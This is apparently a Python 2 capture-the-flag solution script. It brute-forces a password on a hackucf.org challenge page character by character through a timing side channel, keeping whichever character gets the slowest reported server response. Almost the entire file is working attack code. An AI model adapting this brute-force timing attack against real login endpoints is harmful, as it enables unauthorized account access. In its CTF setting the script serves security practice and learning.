## look up timing impact
## server takes longer to respond the more characters you get character
from pwn import *
from bs4 import BeautifulSoup
import urllib2
import requests
import itertools

session = requests.Session()
url = 'http://challenges.hackucf.org/medium2.php'
headers = {'User-Agent': 'Mozilla/5.0'}

r = session.get(url)
#will hold the password
finalPassword = ""

largestTime = 0.000


digits = '0123456789'
symbols= "~@#$%^&*()-_+=\|{}[];:<,>.?/\"'"
alpha= 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
alphanum = alpha + symbols + digits # this should contain all the letters and digits

#def checkTime(time, tok):

	#timeDif = largestTime - time
	#timeDif = timeDif *100

	#print str(timeDif)
#	if (time > largestTime):
	#	largestTime = time
	#	print "THIS MIGHT SOMETHING\n"*100
	#else:
	#	print "probably not a password"
token = ""


def checkTimes(largestTime, password):
	returnChar = ""
	passwd = " "
	for i in xrange(1, 2):
	    for tok in  itertools.product(alphanum, repeat=i):
		passwd = password + ''.join(tok)
		print "password: " + passwd

		#payload = {'passwd': passwd}

		newUrl = "http://challenges.hackucf.org/medium2.php?passwd=" + passwd
		#print newUrl


		#response = session.post(url, data = payload)
		response = session.get(newUrl)

		page2 = response.content


		soup = BeautifulSoup(page2, "lxml") ##add form to beautiful sup to parse

		#soup doesn't return a string
		responseText = str ( soup.find('time') )

		#strip out
		responseText = responseText.strip("</time>")
		responesText = responseText.strip("time")

		#print "lastTime: " + str(lastTime)
		#print responseText
		#print "\n"
		responseFloat = float(responseText)

	#	checkTime(responseFloat, tok)

		if (responseFloat > largestTime):
			largestTime = responseFloat
			print "THIS MIGHT SOMETHING\n"*10
			returnChar = ''.join(tok)

			#print "probably not a password"

	return returnChar

x = 0
password = ""
while (x <10):
	try:
		password += checkTimes(largestTime, password)
	except e:
		print "\n\n\n\n\n\n token is " + password
	x = x+1

	#print "time: " + time + '\n'
